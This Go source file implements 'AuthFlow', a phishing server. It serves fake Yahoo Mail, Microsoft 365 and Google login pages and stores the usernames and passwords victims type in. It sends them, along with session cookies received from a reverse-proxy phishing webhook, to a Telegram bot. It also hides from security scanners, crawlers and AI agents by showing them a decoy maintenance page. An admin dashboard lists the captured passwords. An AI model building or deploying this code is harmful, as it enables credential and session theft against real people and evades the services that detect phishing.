package main

import (
	"bytes"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"html/template"
	"io"
	"log"
	"mime/multipart"
	"os/exec"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"golang.org/x/time/rate"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
)
import "sync/atomic"

type Config struct {
	Domain           string   `json:"domain"`
	VpsIp            string   `json:"vps_ip"`
	TelegramBotToken string   `json:"telegram_bot_token"`
	TelegramChatId   string   `json:"telegram_chat_id"`
	AdminPass        string   `json:"admin_pass"`
	DataDir          string   `json:"data_dir"`
	SubPortal1       string   `json:"sub_portal1"`
	AdminPath        string   `json:"admin_path"`
	SubPortal2       string   `json:"sub_portal2"`
	SubPortal3       string   `json:"sub_portal3"`
	LogRetentionDays int      `json:"log_retention_days"`
	WebhookSecret    string   `json:"webhook_secret"`
	AdminWhitelist   []string `json:"admin_whitelist"`
}

var (
	config     Config
	db         *sql.DB
	configPath string
	startTime  time.Time
	ipRateLimiters = &sync.Map{}
)

type limiterEntry struct {
	limiter  *rate.Limiter
	lastSeen atomic.Int64
}

var botPatterns = []string{
	"googlebot", "bingbot", "yandexbot", "duckduckbot", "slurp", "baiduspider",
	"facebot", "twitterbot", "linkedinbot", "whatsapp", "discordbot", "slackbot",
	"telegrambot", "applebot", "virustotal", "urlscan", "phishtank", "netcraft",
	"bitdefender", "crawler", "spider", "scanner", "curl", "wget",
	"python-requests", "go-http-client", "node-fetch", "axios", "okhttp",
	"headless", "phantom", "puppeteer", "playwright", "chatgpt", "claude",
	"censys", "shodan", "zgrab", "nmap", "masscan", "nikto", "nessus", "hydra",
	"paloaltonetworks", "zscaler", "fortinet", "crowdstrike", "fireeye",
	"drweb", "comodo", "sophos", "kaspersky", "eset",
}

func main() {
	startTime = time.Now()
	flag.StringVar(&configPath, "config", "/opt/authflow/config.json", "config file path")
	port := flag.Int("port", 3000, "server port")
	flag.Parse()

	loadConfig()
	os.MkdirAll(config.DataDir, 0700)
	initDB()
	defer db.Close()

	go runCleanupTicker()
	go runRateLimitCleanup()

	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.Use(gin.Recovery())
	r.SetTrustedProxies([]string{"127.0.0.1", "::1"})

	// Public routes
	r.GET("/_health", healthCheck)
	r.POST("/api/step1", rateLimitMiddleware(rate.Limit(1), 5), step1Handler) // 1 request per second, with a burst of 5
	r.POST("/api/webhook", webhookHandler)

	// Admin routes
	admin := r.Group("/" + config.AdminPath)
	admin.Use(adminAuth())
	{
		admin.GET("/", dashboardHandler)
		admin.GET("/data", dashboardDataHandler)
		admin.GET("/sessions", sessionsHandler)
		admin.GET("/visits", visitsHandler)
		admin.GET("/logs", logsHandler)
		admin.POST("/restart", restartHandler)
		admin.POST("/cleanup", cleanupHandler)
		admin.GET("/download/:id", downloadHandler)
	}

	// Portal handler
	r.NoRoute(portalHandler)

	log.Printf("AuthFlow v2.0 started on port %d", *port)
	log.Printf("Dashboard: http://localhost:%d/%s", *port, config.AdminPath)
	r.Run(fmt.Sprintf("0.0.0.0:%d", *port))
}

func loadConfig() {
	data, err := os.ReadFile(configPath)
	if err != nil {
		log.Fatalf("Config error: %v", err)
	}
	if err := json.Unmarshal(data, &config); err != nil {
		log.Fatalf("Parse error: %v", err)
	}
}

func initDB() {
	dbPath := filepath.Join(config.DataDir, "authflow.db")
	var err error
	db, err = sql.Open("sqlite3", dbPath+"?_journal=WAL&_sync=NORMAL")
	if err != nil {
		log.Fatalf("DB error: %v", err)
	}

	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS sessions (
		id TEXT PRIMARY KEY, site TEXT, username TEXT, password TEXT,
		ip TEXT, ua TEXT, is_bot INTEGER, step1 TEXT, step2 TEXT,
		cookies TEXT, completed INTEGER, created TEXT
	)`)
	if err != nil {
		log.Fatalf("Failed to create sessions table: %v", err)
	}
	db.Exec(`CREATE INDEX IF NOT EXISTS idx_sessions_created ON sessions(created DESC)`)
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS visits (
		id INTEGER PRIMARY KEY AUTOINCREMENT, site TEXT, ip TEXT,
		ua TEXT, is_bot INTEGER, bot TEXT, ref TEXT, created TEXT
	)`)
	if err != nil {
		log.Fatalf("Failed to create visits table: %v", err)
	}
	db.Exec(`CREATE INDEX IF NOT EXISTS idx_visits_created ON visits(created DESC)`)
}

func getClientIP(c *gin.Context) string {
	if cf := c.GetHeader("CF-Connecting-IP"); cf != "" {
		return cf
	}
	if xff := c.GetHeader("X-Forwarded-For"); xff != "" {
		return strings.Split(xff, ",")[0]
	}
	ip := c.ClientIP()
	if idx := strings.Index(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	return ip
}

func isBot(ua string) (bool, string) {
	if ua == "" {
		return true, "Empty UA"
	}
	lower := strings.ToLower(ua)
	for _, b := range botPatterns {
		if strings.Contains(lower, b) {
			return true, b
		}
	}
	if len(ua) < 30 && !strings.Contains(lower, "mozilla") {
		return true, "Short UA"
	}
	return false, ""
}

// rateLimitMiddleware creates a Gin middleware for IP-based rate limiting.
// It uses a token bucket algorithm: `limit` tokens per second, `burst` maximum tokens.
func rateLimitMiddleware(limit rate.Limit, burst int) gin.HandlerFunc {
	return func(c *gin.Context) {
		ip := getClientIP(c)

		val, ok := ipRateLimiters.Load(ip)
		if !ok {
			newEntry := &limiterEntry{
				limiter: rate.NewLimiter(limit, burst),
			}
			val, _ = ipRateLimiters.LoadOrStore(ip, newEntry) // Store and get the actual entry
		}

		entry := val.(*limiterEntry)
		// Update the last seen timestamp atomically
		entry.lastSeen.Store(time.Now().Unix())

		if !entry.limiter.Allow() {
			c.JSON(http.StatusTooManyRequests, gin.H{"error": "Too many requests"})
			c.Abort() // Abort the request if rate-limited
			return
		}
		c.Next() // Proceed to the next handler if allowed
	}
}

func adminAuth() gin.HandlerFunc {
	return func(c *gin.Context) {
		if len(config.AdminWhitelist) > 0 {
			clientIP := getClientIP(c)
			allowed := false
			for _, ip := range config.AdminWhitelist {
				if ip == clientIP {
					allowed = true
					break
				}
			}
			if !allowed {
				c.JSON(403, gin.H{"error": "Access denied: IP not whitelisted"})
				c.Abort()
				return
			}
		}

		auth := c.GetHeader("Authorization")
		if !strings.HasPrefix(auth, "Basic ") {
			c.Header("WWW-Authenticate", `Basic realm="AuthFlow"`)
			c.JSON(401, gin.H{"error": "Auth required"})
			c.Abort()
			return
		}
		payload, _ := base64.StdEncoding.DecodeString(auth[6:])
		parts := strings.SplitN(string(payload), ":", 2)
		if len(parts) != 2 || parts[0] != "admin" || parts[1] != config.AdminPass {
			c.JSON(403, gin.H{"error": "Invalid credentials"})
			c.Abort()
			return
		}
		c.Next()
	}
}

func portalHandler(c *gin.Context) {
	host := c.Request.Host
	ua := c.GetHeader("User-Agent")
	ip := getClientIP(c)

	// Handle root domain access first
	isRoot := host == config.Domain || host == "www."+config.Domain

	if bot, name := isBot(ua); bot || isRoot { // Check for bots OR root domain access
		db.Exec(`INSERT INTO visits (site, ip, ua, is_bot, bot, ref, created) VALUES (?, ?, ?, 1, ?, ?, ?)`,
			"unknown", ip, ua, name, c.GetHeader("Referer"), time.Now().Format(time.RFC3339))
		c.Header("Content-Type", "text/html")
		c.String(200, decoyHTML)
		return
	}

	var site string
	if strings.Contains(host, config.SubPortal1) {
		site = "portal1"
	} else if strings.Contains(host, config.SubPortal2) {
		site = "portal2"
	} else if strings.Contains(host, config.SubPortal3) {
		site = "portal3"
	} else {
		// If not a known portal subdomain and not the root domain, return 404. This is the final fallback.
		c.String(404, "Not Found")
		return
	}

	_, err := db.Exec(`INSERT INTO visits (site, ip, ua, is_bot, bot, ref, created) VALUES (?, ?, ?, 0, ?, ?, ?)`,
		site, ip, ua, "", c.GetHeader("Referer"), time.Now().Format(time.RFC3339))
	if err != nil {
		log.Printf("Error inserting visit for IP %s: %v", ip, err)
	}

	page := getPhishingPage(site)
	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(200, page)
}

func getPhishingPage(site string) string {
	pages := map[string]string{
		"portal1": `<!DOCTYPE html>
<html><head><title>Yahoo Mail</title>
<style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:320px}h1{color:#400090;margin-bottom:20px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}button{width:100%;padding:12px;background:#400090;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}</style>
</head>
<body><div class="box"><h1>Yahoo Mail</h1>
<form id="f"><input type="text" id="u" placeholder="Email or phone" required><input type="password" id="p" placeholder="Password" required><button type="submit">Sign in</button></form></div>
<script>document.getElementById('f').addEventListener('submit',async function(e){e.preventDefault();await fetch('/api/step1',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'portal1',username:document.getElementById('u').value,password:document.getElementById('p').value})});window.location.href='https://login.yahoo.com';});</script></body></html>`,

		"portal2": `<!DOCTYPE html>
<html><head><title>Microsoft 365</title>
<style>body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f1f1f1;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;box-shadow:0 2px 20px rgba(0,0,0,.1);width:380px}h1{font-size:24px;font-weight:400;margin-bottom:20px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:2px;box-sizing:border-box}button{width:100%;padding:12px;background:#0067b8;color:#fff;border:none;cursor:pointer;font-size:14px}</style>
</head>
<body><div class="box"><h1>Sign in</h1>
<form id="f"><input type="text" id="u" placeholder="Email, phone, or Skype" required><input type="password" id="p" placeholder="Password" required><button type="submit">Sign in</button></form></div>
<script>document.getElementById('f').addEventListener('submit',async function(e){e.preventDefault();await fetch('/api/step1',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'portal2',username:document.getElementById('u').value,password:document.getElementById('p').value})});window.location.href='https://outlook.live.com';});</script></body></html>`,

		"portal3": `<!DOCTYPE html>
<html><head><title>Google Sign in</title>
<style>body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{text-align:center;width:450px;padding:48px 40px 36px}h1{font-size:24px;font-weight:400;margin-bottom:10px}input{width:100%;padding:13px 15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}button{width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:14px}</style>
</head>
<body><div class="box"><h1>Sign in</h1><p>to continue to Gmail</p>
<form id="f"><input type="text" id="u" placeholder="Email or phone" required><input type="password" id="p" placeholder="Password" required><button type="submit">Next</button></form></div>
<script>document.getElementById('f').addEventListener('submit',async function(e){e.preventDefault();await fetch('/api/step1',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site:'portal3',username:document.getElementById('u').value,password:document.getElementById('p').value})});window.location.href='https://accounts.google.com';});</script></body></html>`,
	}
	return pages[site]
}

func step1Handler(c *gin.Context) {
	var req struct {
		Site     string `json:"site"`
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	id := uuid.New().String()
	ip := getClientIP(c)

	_, err = db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, is_bot, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, 0, ?, 0, ?)`,
		id, req.Site, req.Username, req.Password, ip, c.GetHeader("User-Agent"), time.Now().Format(time.RFC3339), time.Now().Format(time.RFC3339))
	if err != nil {
		log.Printf("Error inserting session for IP %s: %v", ip, err)
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}

	msg := fmt.Sprintf("<b>🔐 NEW CREDENTIALS</b>\n\n<b>Site:</b> %s\n<b>User:</b> %s\n<b>Pass:</b> %s\n<b>IP:</b> %s\n<b>Time:</b> %s", // Corrected format string
		req.Site, req.Username, req.Password, ip, time.Now().Format("2006-01-02 15:04:05"))
	go sendTelegram(msg)

	c.JSON(200, gin.H{"success": true, "id": id})
}

func webhookHandler(c *gin.Context) {
	secret := c.GetHeader("X-AuthFlow-Secret")
	if config.WebhookSecret != "" && secret != config.WebhookSecret {
		c.JSON(403, gin.H{"error": "Invalid secret"})
		return
	}

	var body map[string]interface{}
	c.ShouldBindJSON(&body)

	event, _ := body["event"].(string)
	phishlet, _ := body["phishlet"].(string)
	username, _ := body["username"].(string)

	if event == "credentials" {
		password, _ := body["password"].(string)
		id := uuid.New().String()
		ip := getClientIP(c)
		if ra, ok := body["remote_addr"].(string); ok && ra != "" {
			ip = ra
		}
		ua, _ := body["user_agent"].(string)

		_, err := db.Exec(`INSERT INTO sessions (id, site, username, password, ip, ua, step1, completed, created) VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?)`,
			id, phishlet, username, password, ip, ua, time.Now().Format(time.RFC3339), time.Now().Format(time.RFC3339))
		if err != nil {
			log.Printf("Error inserting webhook session for IP %s: %v", ip, err)
		}

		msg := fmt.Sprintf("<b>🔐 WEBHOOK CREDENTIALS</b>\n\n<b>Site:</b> %s\n<b>User:</b> %s\n<b>Pass:</b> %s\n<b>IP:</b> %s",
			phishlet, username, password, ip)
		go sendTelegram(msg)
		c.JSON(200, gin.H{"success": true, "id": id})
	} else if event == "session" {
		cookies, _ := body["cookie_str"].(string)
		var id string
		err := db.QueryRow(`SELECT id FROM sessions WHERE username = ? AND site = ? AND completed = 0 ORDER BY created DESC LIMIT 1`, // Added error check
			username, phishlet).Scan(&id)
		if err != nil && err != sql.ErrNoRows {
			log.Printf("Error querying session for webhook: %v", err)
		}
		if id != "" {
			_, err = db.Exec(`UPDATE sessions SET cookies = ?, step2 = ?, completed = 1 WHERE id = ?`,
				cookies, time.Now().Format(time.RFC3339), id)
			go sendTelegramFile(fmt.Sprintf("%s_%s.txt", phishlet, id), cookies, username)
		}
		c.JSON(200, gin.H{"success": true})
	} else {
		c.JSON(200, gin.H{"success": true})
	}
}

func healthCheck(c *gin.Context) {
	var result int
	db.QueryRow("SELECT 1").Scan(&result)
	c.JSON(200, gin.H{
		"status":    "ok",
		"database":  "connected",
		"uptime":    time.Since(startTime).Seconds(),
		"version":   "2.0.0",
		"timestamp": time.Now().Format(time.RFC3339),
	})
}

func dashboardHandler(c *gin.Context) {
	c.Header("Content-Type", "text/html; charset=utf-8")
	tmpl, err := template.New("dashboard").Parse(dashboardHTML) // Added error check for template parsing
	if err != nil {
		log.Printf("Error parsing dashboard template: %v", err)
		c.String(500, "Internal Server Error")
		return
	}
	err = tmpl.Execute(c.Writer, gin.H{
		"domain":    config.Domain,
		"version":   "2.0.0",
		"goVersion": runtime.Version(),
	})
	if err != nil { // Added error check for template execution
		log.Printf("Error executing dashboard template: %v", err)
	}
}

func dashboardDataHandler(c *gin.Context) {
	var totalSessions, totalVisits, totalBots int
	if err := db.QueryRow("SELECT COUNT(*) FROM sessions").Scan(&totalSessions); err != nil {
		log.Printf("Error getting total sessions: %v", err)
	}
	if err := db.QueryRow("SELECT COUNT(*) FROM visits").Scan(&totalVisits); err != nil {
		log.Printf("Error getting total visits: %v", err)
	}
	if err := db.QueryRow("SELECT COUNT(*) FROM visits WHERE is_bot = 1").Scan(&totalBots); err != nil {
		log.Printf("Error getting total bots: %v", err)
	}

	sessionRows, err := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 30`) // Added error check
	if err != nil {
		log.Printf("Error querying recent sessions: %v", err)
		sessionRows = &sql.Rows{} // Provide empty rows to prevent nil pointer dereference
	}
	var sessions []map[string]interface{}
	for sessionRows.Next() {
		var id, site, user, pass, ip, created string
		var completed int
		sessionRows.Scan(&id, &site, &user, &pass, &ip, &completed, &created)
		sessions = append(sessions, map[string]interface{}{
			"id": id[:8], "site": site, "username": user, "password": pass,
			"ip": ip, "completed": completed == 1, "time": created,
		})
	}

	visitRows, err := db.Query(`SELECT created, site, ip, is_bot, bot FROM visits ORDER BY created DESC LIMIT 30`)
	if err != nil { // Added error check
		log.Printf("Error querying recent visits: %v", err)
		visitRows = &sql.Rows{} // Provide empty rows
	}
	var visits []map[string]interface{}
	for visitRows.Next() {
		var created, site, ip, bot string
		var isBot int
		if err := visitRows.Scan(&created, &site, &ip, &isBot, &bot); err != nil { // Added error check for scan
			log.Printf("Error scanning visit row: %v", err)
			continue
		}
		visits = append(visits, map[string]interface{}{
			"time": created[11:19], "site": site, "ip": ip,
			"type": map[bool]string{true: "bot", false: "human"}[isBot == 1],
			"bot":  bot,
		})
	}

	c.JSON(200, gin.H{
		"stats": gin.H{
			"sessions": totalSessions,
			"visits":   totalVisits,
			"bots":     totalBots,
			"humans":   totalVisits - totalBots,
		},
		"sessions": sessions,
		"visits":   visits,
		"server": gin.H{
			"uptime":    time.Since(startTime).Seconds(),
			"goVersion": runtime.Version(),
		},
		"portals": gin.H{
			"portal1": config.SubPortal1 + "." + config.Domain,
			"portal2": config.SubPortal2 + "." + config.Domain,
			"portal3": config.SubPortal3 + "." + config.Domain,
		},
	})
}

func sessionsHandler(c *gin.Context) {
	rows, err := db.Query(`SELECT id, site, username, password, ip, completed, created FROM sessions ORDER BY created DESC LIMIT 100`) // Added error check
	if err != nil {
		log.Printf("Error querying sessions: %v", err)
		c.JSON(500, gin.H{"error": "Failed to retrieve sessions"})
		return
	}
	defer rows.Close()
	var sessions []map[string]interface{}
	for rows.Next() {
		var id, site, user, pass, ip, created string
		var completed int
		if err := rows.Scan(&id, &site, &user, &pass, &ip, &completed, &created); err != nil { // Fixed: use rows instead of sessionRows
			log.Printf("Error scanning session row: %v", err)
			continue
		}
		sessions = append(sessions, map[string]interface{}{
			"id": id[:8], "site": site, "username": user, "password": pass,
			"ip": ip, "completed": completed == 1, "time": created,
		})
	}
	c.JSON(200, sessions)
}

func visitsHandler(c *gin.Context) {
	rows, err := db.Query(`SELECT created, site, ip, is_bot, bot, ref FROM visits ORDER BY created DESC LIMIT 100`) // Added error check
	if err != nil {
		log.Printf("Error querying visits: %v", err)
		c.JSON(500, gin.H{"error": "Failed to retrieve visits"})
		return
	}
	defer rows.Close()
	var visits []map[string]interface{}
	for rows.Next() {
		var created, site, ip, bot, ref string
		var isBot int
		if err := rows.Scan(&created, &site, &ip, &isBot, &bot, &ref); err != nil { // Added error check for scan
			log.Printf("Error scanning visit row: %v", err)
			continue
		}
		visits = append(visits, map[string]interface{}{
			"time": created, "site": site, "ip": ip,
			"is_bot": isBot == 1, "bot": bot, "ref": ref,
		})
	}
	c.JSON(200, visits)
}

func logsHandler(c *gin.Context) {
	lines := c.DefaultQuery("lines", "100")
	cmd := execCommand("tail", "-n", lines, "/opt/authflow/logs/authflow.log")
	output, err := cmd.Output()
	if err != nil {
		log.Printf("Error executing tail command: %v", err)
		c.String(500, "Failed to retrieve logs")
		return
	}
	c.String(200, string(output))
}

func restartHandler(c *gin.Context) {
	go func() {
		time.Sleep(1 * time.Second)
		cmd := execCommand("systemctl", "restart", "authflow")
		if err := cmd.Run(); err != nil { // Added error check for systemctl command
			log.Printf("Error restarting authflow service: %v", err)
		}
	}()
	c.JSON(200, gin.H{"success": true, "message": "Restarting..."})
}

func cleanupHandler(c *gin.Context) {
	retention := config.LogRetentionDays
	if retention <= 0 {
		retention = 30
	}
	cutoff := time.Now().AddDate(0, 0, -retention).Format(time.RFC3339)
	if _, err := db.Exec("DELETE FROM sessions WHERE created < ?", cutoff); err != nil {
		log.Printf("Error cleaning up old sessions: %v", err)
	}
	if _, err := db.Exec("DELETE FROM visits WHERE created < ?", cutoff); err != nil {
		log.Printf("Error cleaning up old visits: %v", err)
	}
	db.Exec("VACUUM")
	c.JSON(200, gin.H{"success": true, "message": "Cleanup complete"})
}

func downloadHandler(c *gin.Context) {
	id := c.Param("id")
	var cookies string
	err := db.QueryRow("SELECT cookies FROM sessions WHERE id LIKE ?", id+"%").Scan(&cookies)
	if err == sql.ErrNoRows {
		c.String(404, "Session not found")
		return
	} else if err != nil {
		log.Printf("Error downloading session %s: %v", id, err)
		c.String(500, "Internal Server Error")
		return
	}
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=session_%s.txt", id))
	c.String(200, cookies)
}

func sendTelegram(msg string) {
	if config.TelegramBotToken == "" {
		return
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", config.TelegramBotToken)
	data, _ := json.Marshal(map[string]string{
		"chat_id": config.TelegramChatId, "text": msg, "parse_mode": "HTML",
	})
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(data))
	if err != nil {
		log.Printf("Error sending Telegram message: %v", err)
	} else if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		log.Printf("Telegram API error (%d): %s", resp.StatusCode, string(body))
	}
	if resp != nil {
		resp.Body.Close()
	}
}

func sendTelegramFile(name, content, caption string) {
	if config.TelegramBotToken == "" {
		return
	}
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", config.TelegramBotToken)
	body := &bytes.Buffer{}
	w := multipart.NewWriter(body)
	part, _ := w.CreateFormFile("document", name)
	part.Write([]byte(content))
	w.WriteField("chat_id", config.TelegramChatId)
	w.WriteField("caption", caption)
	w.Close()
	resp, err := http.Post(url, w.FormDataContentType(), body)
	if err != nil {
		log.Printf("Error sending Telegram file: %v", err)
	} else if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		log.Printf("Telegram API error (%d): %s", resp.StatusCode, string(body))
	}
	if resp != nil {
		resp.Body.Close()
	}
}

func runRateLimitCleanup() {
	ticker := time.NewTicker(10 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		now := time.Now()
		ipRateLimiters.Range(func(key, value interface{}) bool {
			entry := value.(*limiterEntry)
			// Load the timestamp atomically and check duration
			lastSeen := time.Unix(entry.lastSeen.Load(), 0)
			if now.Sub(lastSeen) > 15*time.Minute {
				ipRateLimiters.Delete(key)
			}
			return true
		})
	}
}

func runCleanupTicker() {
	ticker := time.NewTicker(24 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		retention := config.LogRetentionDays
		if retention <= 0 {
			retention = 30
		}
		cutoff := time.Now().AddDate(0, 0, -retention).Format(time.RFC3339)
		if _, err := db.Exec("DELETE FROM sessions WHERE created < ?", cutoff); err != nil {
			log.Printf("Error cleaning up old sessions in ticker: %v", err)
		}
		if _, err := db.Exec("DELETE FROM visits WHERE created < ?", cutoff); err != nil {
			log.Printf("Error cleaning up old visits in ticker: %v", err)
		}
		db.Exec("VACUUM")
	}
}

const decoyHTML = `<!DOCTYPE html><html><head><title>Under Construction</title></head><body style="font-family:sans-serif;text-align:center;padding-top:50px;"><h1>Maintenance Mode</h1><p>This site is currently undergoing scheduled maintenance. Please check back later.</p></body></html>`

func execCommand(name string, args ...string) *exec.Cmd {
	return exec.Command(name, args...)
}

const dashboardHTML = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>AuthFlow Dashboard</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0e27;color:#e0e0e0}.header{background:linear-gradient(135deg,#0f1535,#0a0e27);padding:15px 25px;border-bottom:1px solid #1e2a4a;display:flex;justify-content:space-between;align-items:center}.logo h1{font-size:22px;background:linear-gradient(135deg,#00d4ff,#7b2cbf);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.stats{display:flex;gap:15px}.stat-badge{background:#1a1f3e;padding:8px 18px;border-radius:20px;border-left:3px solid #00d4ff}.stat-badge .label{font-size:11px;color:#8a9dc0}.stat-badge .value{font-size:20px;font-weight:bold}.container{display:flex;height:calc(100vh - 70px)}.sidebar{width:260px;background:#0d1130;border-right:1px solid #1e2a4a;padding:15px}.menu-item{padding:10px 12px;margin:4px 0;border-radius:8px;cursor:pointer}.menu-item:hover,.menu-item.active{background:#1a1f3e;color:#00d4ff}.control-btn{width:100%;padding:10px;margin:8px 0;background:#1a1f3e;border:1px solid #2a3a5a;color:#e0e0e0;border-radius:8px;cursor:pointer}.control-btn:hover{background:#2a3a5a;border-color:#00d4ff}.content{flex:1;padding:20px;overflow-y:auto}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:15px;margin-bottom:25px}.stat-card{background:#1a1f3e;padding:18px;border-radius:12px;border-left:4px solid #00d4ff}.stat-card h4{font-size:12px;color:#8a9dc0;margin-bottom:8px}.stat-card .number{font-size:32px;font-weight:bold}.data-table{width:100%;border-collapse:collapse;background:#0d1130;border-radius:12px;overflow:hidden}.data-table th{background:#1a1f3e;padding:12px;text-align:left;font-size:12px;color:#8a9dc0}.data-table td{padding:10px 12px;border-bottom:1px solid #1e2a4a;font-size:13px}.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600}.badge-human{background:#10b981}.badge-bot{background:#ef4444}.badge-portal1{background:#8b5cf6}.badge-portal2{background:#06b6d4}.badge-portal3{background:#f59e0b}.log-container{background:#0a0e27;font-family:monospace;font-size:12px;height:100%;overflow-y:auto}.log-line{padding:4px 12px;border-bottom:1px solid #1a1f3e;color:#a0aec0}.refresh{position:fixed;bottom:20px;right:20px;background:#00d4ff;color:#0a0e27;padding:5px 12px;border-radius:20px;font-size:11px;opacity:0;transition:opacity 0.3s}</style></head>
<body><div class="header"><div class="logo"><h1>🎯 AuthFlow</h1><p>v{{.version}} | {{.goVersion}}</p></div><div class="stats" id="headerStats"><div class="stat-badge"><div class="label">Sessions</div><div class="value" id="statSessions">0</div></div><div class="stat-badge"><div class="label">Visits</div><div class="value" id="statVisits">0</div></div><div class="stat-badge"><div class="label">Humans</div><div class="value" id="statHumans">0</div></div><div class="stat-badge"><div class="label">Bots</div><div class="value" id="statBots">0</div></div></div></div><div class="container"><div class="sidebar"><div class="menu-item active" data-tab="dashboard">📈 Live Dashboard</div><div class="menu-item" data-tab="sessions">🔐 Captured Sessions</div><div class="menu-item" data-tab="traffic">🌐 Traffic Log</div><div class="menu-item" data-tab="logs">📜 System Logs</div><hr style="margin:15px 0;border-color:#1e2a4a"><button class="control-btn" onclick="restartService()">🔄 Restart Service</button><button class="control-btn" onclick="runCleanup()">🗑️ Force Cleanup</button></div><div class="content"><div id="dashboardPanel"><div class="stats-grid"><div class="stat-card"><h4>Total Sessions</h4><div class="number" id="statTotalSessions">-</div></div><div class="stat-card"><h4>Total Visits</h4><div class="number" id="statTotalVisits">-</div></div><div class="stat-card"><h4>Human Visits</h4><div class="number" id="statTotalHumans">-</div></div><div class="stat-card"><h4>Bot Blocks</h4><div class="number" id="statTotalBots">-</div></div></div><h3>📋 Recent Captures</h3><table class="data-table" id="recentTable"><thead><tr><th>Site</th><th>Username</th><th>Password</th><th>IP</th><th>Time</th></tr></thead><tbody><tr><td colspan="5">Loading...</td></tr></tbody></table></div><div id="sessionsPanel" style="display:none"><table class="data-table" id="sessionsTable"><thead><tr><th>ID</th><th>Site</th><th>Username</th><th>Password</th><th>IP</th><th>Time</th><th>Status</th><th>Action</th></tr></thead><tbody><tr><td colspan="8">Loading...</td></tr></tbody></table></div><div id="trafficPanel" style="display:none"><table class="data-table" id="trafficTable"><thead><tr><th>Time</th><th>Site</th><th>IP</th><th>Type</th></tr></thead><tbody><tr><td colspan="4">Loading...</td></tr></tbody></table></div><div id="logsPanel" style="display:none"><div class="log-container" id="logContainer"><div class="log-line">Loading logs...</div></div></div></div></div><div class="refresh" id="refreshIndicator">🔄 Updated</div><script>let activeTab='dashboard';const adminPrefix=window.location.pathname.split('/')[1];async function loadDashboard(){try{const res=await fetch('/'+adminPrefix+'/data');const data=await res.json();document.getElementById('statTotalSessions').textContent=data.stats.sessions;document.getElementById('statTotalVisits').textContent=data.stats.visits;document.getElementById('statTotalHumans').textContent=data.stats.humans;document.getElementById('statTotalBots').textContent=data.stats.bots;document.getElementById('statSessions').textContent=data.stats.sessions;document.getElementById('statVisits').textContent=data.stats.visits;document.getElementById('statHumans').textContent=data.stats.humans;document.getElementById('statBots').textContent=data.stats.bots;const recentHtml=data.sessions.map(s=>`<tr><td><span class="badge badge-portal${s.site==='portal1'?'1':(s.site==='portal2'?'2':'3')}">${s.site}</span></td><td>${escapeHtml(s.username)}</td><td>${escapeHtml(s.password)}</td><td>${s.ip}</td><td>${s.time}</td></tr>`).join('');document.querySelector('#recentTable tbody').innerHTML=recentHtml||'<tr><td colspan="5">No data</td></tr>';showRefresh();}catch(e){console.error(e)}}async function loadSessions(){try{const res=await fetch('/'+adminPrefix+'/sessions');const data=await res.json();const html=data.map(s=>`<tr><td>${s.id}</td><td><span class="badge badge-portal${s.site==='portal1'?'1':(s.site==='portal2'?'2':'3')}">${s.site}</span></td><td>${escapeHtml(s.username)}</td><td>${escapeHtml(s.password)}</td><td>${s.ip}</td><td>${s.time}</td><td><span class="badge ${s.completed?'badge-human':'badge-bot'}">${s.completed?'Completed':'Pending'}</span></td><td>${s.completed?`<button onclick="downloadSession('${s.id}')" style="padding:4px 8px;background:#2a3a5a;border:none;color:#fff;border-radius:4px;cursor:pointer">Download</button>`:'-'}</td></tr>`).join('');document.querySelector('#sessionsTable tbody').innerHTML=html||'<tr><td colspan="8">No sessions</td></tr>';}catch(e){console.error(e)}}async function loadTraffic(){try{const res=await fetch('/'+adminPrefix+'/visits');const data=await res.json();const html=data.map(v=>`<tr><td>${v.time}</td><td><span class="badge badge-portal${v.site==='portal1'?'1':(v.site==='portal2'?'2':'3')}">${v.site}</span></td><td>${v.ip}</td><td><span class="badge 